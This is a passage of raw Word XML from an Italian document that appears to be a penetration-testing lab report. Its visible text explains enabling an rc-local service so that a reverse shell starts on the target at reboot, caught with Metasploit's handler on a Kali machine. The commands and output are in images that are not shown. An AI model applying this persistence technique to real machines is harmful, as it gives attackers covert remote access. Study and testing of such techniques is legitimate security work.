        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>rc-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>local.service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0A15FF65" w14:textId="2EFEB823" w:rsidR="000172D7" w:rsidRDefault="008F7FC4" w:rsidP="00054D0B">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251741184" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="47E1E406" wp14:editId="2B4F4FE0">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>2329180</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1566545</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="45085" cy="73660"/>
            <wp:effectExtent l="0" t="0" r="0" b="2540"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="125087706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85" cy="73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4C37">
        <w:rPr>
          <w:noProof/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251740160" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="171B3106" wp14:editId="76EC98DD">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>1670050</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1569085</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="844550" cy="62230"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="8771595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44550" cy="6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4C37">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251739136" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2ABCFEEA" wp14:editId="18DA7889">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>-8890</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1019810</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5274310" cy="1164590"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1059927896" name="Immagine 2"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27896" name="Immagine 2" descr="Immagine che contiene testo, schermata, Carattere, informazione&#10;&#10;Descrizione generat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164590"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:t xml:space="preserve">Dopodiché bisogna abilitare il servizio con il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>systemctl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>enable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>rc-loc</w:t>
      </w:r>
      <w:r w:rsidR="00594C37">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>al</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:t xml:space="preserve">e avviarlo con il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>systemctl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>rc-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>local.service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:t xml:space="preserve">. Per controllare che effettivamente il servizio sia abilitato e avviato è possibile usare il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>systemctl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> status</w:t>
      </w:r>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>rc-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>local.service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="000172D7">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="000172D7" w:rsidRPr="000172D7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F81F808" w14:textId="0CC9A655" w:rsidR="000172D7" w:rsidRDefault="000172D7" w:rsidP="00054D0B">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="111764DC" w14:textId="15D58B94" w:rsidR="00594C37" w:rsidRDefault="00594C37" w:rsidP="00054D0B">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FA56DF4" w14:textId="3767C3D9" w:rsidR="00594C37" w:rsidRPr="00594C37" w:rsidRDefault="00594C37" w:rsidP="00054D0B">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22A1D1EC" w14:textId="1C6AEF96" w:rsidR="000172D7" w:rsidRDefault="000172D7" w:rsidP="000172D7">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000172D7">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Una volta fatto ciò al riavvio della macchina target verrà instaurata </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:t>una reverse</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:t xml:space="preserve"> shell quindi è necessario mettersi in ascolto sulla macchina </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:t>kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:t xml:space="preserve"> utilizzando il modulo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:t>handler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:t xml:space="preserve"> di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000172D7">
        <w:t>metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000172D7">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390BA584" w14:textId="6EE47AFB" w:rsidR="000172D7" w:rsidRDefault="005F7130" w:rsidP="00054D0B">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251742208" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="794037FC" wp14:editId="28F286BE">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>1848739</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1437640</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="53340" cy="86402"/>
            <wp:effectExtent l="0" t="0" r="3810" b="8890"/>
            <wp:wrapNone/>
            <wp:docPr id="158454941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 cy="86402"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelV relativeFrom="margin">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="008746E9">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4BABCCE9" wp14:editId="7E3F188B">
            <wp:extent cx="5274310" cy="2221865"/>
            <wp:effectExtent l="0" t="0" r="2540" b="6985"/>
            <wp:docPr id="1855702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2841" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId67"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2221865"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="773677E0" w14:textId="52AAC495" w:rsidR="00762A03" w:rsidRPr="00762A03" w:rsidRDefault="000172D7" w:rsidP="008746E9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>33</w:t>
      </w:r>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="008746E9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Reverse</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008746E9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F1853E" w14:textId="7952E399" w:rsidR="00762A03" w:rsidRPr="00762A03" w:rsidRDefault="00762A03" w:rsidP="00762A03"/>
    <w:p w14:paraId="7F92E202" w14:textId="05DEFAD1" w:rsidR="00762A03" w:rsidRDefault="00762A03" w:rsidP="00762A03">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="229FBD05" w14:textId="4ED8D15B" w:rsidR="00762A03" w:rsidRPr="00762A03" w:rsidRDefault="00762A03" w:rsidP="00762A03">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00762A03" w:rsidRPr="00762A03" w:rsidSect="00CA3275">
      <w:footerReference w:type="default" r:id="rId68"/>
      <w:pgSz w:w="11906" w:h="16838"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3EE4C" w14:textId="77777777" w:rsidR="006A1778" w:rsidRDefault="006A1778">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="386ED0EB" w14:textId="77777777" w:rsidR="006A1778" w:rsidRDefault="006A17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MR10">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="CMTI10">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="Calibri-Italic">
    <w:altName w:val="Calibri"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="SFTI1000">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="SFBX1000">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="CourierNewPS-BoldMT">
    <w:altName w:val="Courier New"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="Calibri-Bold">
    <w:altName w:val="Calibri"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="SFRM100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DE72C" w14:textId="77777777" w:rsidR="001638F6" w:rsidRDefault="00844483">
    <w:pPr>
      <w:pStyle w:val="Pidipagina"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:lang w:bidi="it-IT"/>
      </w:rPr>
      <w:t xml:space="preserve">PAGINA </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:bidi="it-IT"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:bidi="it-IT"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE  \* Arabic  \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:bidi="it-IT"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00D922B7">
      <w:rPr>
        <w:noProof/>
        <w:lang w:bidi="it-IT"/>
      </w:rPr>
      <w:t>1</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:bidi="it-I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B863E" w14:textId="77777777" w:rsidR="006A1778" w:rsidRDefault="006A1778">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="27172968" w14:textId="77777777" w:rsidR="006A1778" w:rsidRDefault="006A177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Numeroelenco"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="360"/>
        </w:tabs>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="1" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="FFFFFF89"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="75781F0C"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Puntoelenco"/>
      <w:lvlText w:val="−"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Century Gothic" w:hAnsi="Century Gothic" w:hint="default"/>
        <w:color w:val="0D0D0D" w:themeColor="text1" w:themeTint="F2"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="194A513D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D1BA4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AE7738"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BE16C80C"/>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4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2FDE1ED5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="272E9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614A4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="22185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B949F5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="07268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9F3E6D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="34504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896B65"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="366C41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E7402BB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E6D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1B514A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B4803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CE33CF8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B018F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A40620"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4B9E413A"/>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13" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6E50332D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F31AD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060548B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3B5CB3C2"/>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15" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="76CA70CC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="03C87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D42C00"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="86AE5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D875E6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9E06FDC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16cid:durableId="453526803">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="459304060">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1878666120">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="530725049">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1420911542">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="858081547">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1604024419">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1063482676">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1304314636">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1904220179">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="622613525">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1529297369">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1664888709">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1636570621">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1531916967">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="727922357">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="1897085339">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="652805479">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attachedTemplate r:id="rId1"/>
  <w:defaultTabStop w:val="720"/>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YyMjA2MDYxMzE0MjVV0lEKTi0uzszPAykwrAUAuIsJbSwAAAA="/>
  </w:docVars>
  <w:rsids>
    <w:rsidRoot w:val="00121413"/>
    <w:rsid w:val="00016D37"/>
    <w:rsid w:val="000172D7"/>
    <w:rsid w:val="0003027C"/>
    <w:rsid w:val="000336E2"/>
    <w:rsid w:val="00033D6F"/>
    <w:rsid w:val="00034863"/>
    <w:rsid w:val="00034E55"/>
    <w:rsid w:val="00045D16"/>
    <w:rsid w:val="00054D0B"/>
    <w:rsid w:val="00061D15"/>
    <w:rsid w:val="00065C79"/>
    <w:rsid w:val="00067544"/>
    <w:rsid w:val="000748AA"/>
    <w:rsid w:val="00083AF2"/>
    <w:rsid w:val="000A5C5D"/>
    <w:rsid w:val="000A6977"/>
    <w:rsid w:val="000A6C8E"/>
    <w:rsid w:val="000B7D0D"/>
    <w:rsid w:val="000C6762"/>
    <w:rsid w:val="0010041E"/>
    <w:rsid w:val="00100D34"/>
    <w:rsid w:val="00110905"/>
    <w:rsid w:val="001155C7"/>
    <w:rsid w:val="00121413"/>
    <w:rsid w:val="00127A8F"/>
    <w:rsid w:val="001373A0"/>
    <w:rsid w:val="00144B75"/>
    <w:rsid w:val="001638F6"/>
    <w:rsid w:val="00167339"/>
    <w:rsid w:val="00172FAB"/>
    <w:rsid w:val="001A0050"/>
    <w:rsid w:val="001A2000"/>
    <w:rsid w:val="001B613B"/>
    <w:rsid w:val="001C0326"/>
    <w:rsid w:val="001D06DC"/>
    <w:rsid w:val="001D72C5"/>
    <w:rsid w:val="002438A8"/>
    <w:rsid w:val="00250578"/>
    <w:rsid w:val="00251C0D"/>
    <w:rsid w:val="00262AA4"/>
    <w:rsid w:val="002801C7"/>
    <w:rsid w:val="00287683"/>
    <w:rsid w:val="002A18BB"/>
    <w:rsid w:val="002A1A98"/>
    <w:rsid w:val="002B3E8D"/>
    <w:rsid w:val="002E0F60"/>
    <w:rsid w:val="002E4A02"/>
    <w:rsid w:val="002F79CF"/>
    <w:rsid w:val="002F79F1"/>
    <w:rsid w:val="00301ADD"/>
    <w:rsid w:val="00301D40"/>
    <w:rsid w:val="003023C4"/>
    <w:rsid w:val="00303C58"/>
    <w:rsid w:val="003209D6"/>
    <w:rsid w:val="00330BAA"/>
    <w:rsid w:val="00334A73"/>
    <w:rsid w:val="003422FF"/>
    <w:rsid w:val="00345496"/>
    <w:rsid w:val="00352443"/>
    <w:rsid w:val="00375648"/>
    <w:rsid w:val="00382C67"/>
    <w:rsid w:val="00384A0C"/>
    <w:rsid w:val="003974D7"/>
    <w:rsid w:val="003B0298"/>
    <w:rsid w:val="003B51EE"/>
    <w:rsid w:val="003D7E9D"/>
    <w:rsid w:val="003F23D5"/>
    <w:rsid w:val="003F27AD"/>
    <w:rsid w:val="003F2E50"/>
    <w:rsid w:val="00412BD5"/>
    <w:rsid w:val="00416695"/>
    <w:rsid w:val="00422AFC"/>
    <w:rsid w:val="00437A82"/>
    <w:rsid w:val="00451291"/>
    <w:rsid w:val="00452DAD"/>
    <w:rsid w:val="00463AEB"/>
    <w:rsid w:val="00467444"/>
    <w:rsid w:val="0047127B"/>
    <w:rsid w:val="004952C4"/>
    <w:rsid w:val="004A3D0B"/>
    <w:rsid w:val="004C5D83"/>
    <w:rsid w:val="005074DA"/>
    <w:rsid w:val="00512CBC"/>
    <w:rsid w:val="0054046A"/>
    <w:rsid w:val="005407FF"/>
    <w:rsid w:val="00550195"/>
    <w:rsid w:val="005668D3"/>
    <w:rsid w:val="00594C37"/>
    <w:rsid w:val="00596F19"/>
    <w:rsid w:val="005A1C5A"/>
    <w:rsid w:val="005B6414"/>
    <w:rsid w:val="005C13E8"/>
    <w:rsid w:val="005C3D12"/>
    <w:rsid w:val="005C6C82"/>
    <w:rsid w:val="005D0B17"/>
    <w:rsid w:val="005D1AB9"/>
    <w:rsid w:val="005D2BA2"/>
    <w:rsid w:val="005D6A9F"/>
    <w:rsid w:val="005D7D15"/>
    <w:rsid w:val="005E1E61"/>
    <w:rsid w:val="005E7806"/>
    <w:rsid w:val="005F1DF6"/>
    <w:rsid w:val="005F3AFD"/>
    <w:rsid w:val="005F5985"/>
    <w:rsid w:val="005F7130"/>
    <w:rsid w:val="00626463"/>
    <w:rsid w:val="006504D5"/>
    <w:rsid w:val="00680E7B"/>
    <w:rsid w:val="00690EFD"/>
    <w:rsid w:val="006A1778"/>
    <w:rsid w:val="006A6433"/>
    <w:rsid w:val="006B1360"/>
    <w:rsid w:val="006C1913"/>
    <w:rsid w:val="007021DE"/>
    <w:rsid w:val="00703494"/>
    <w:rsid w:val="0070599A"/>
    <w:rsid w:val="00732607"/>
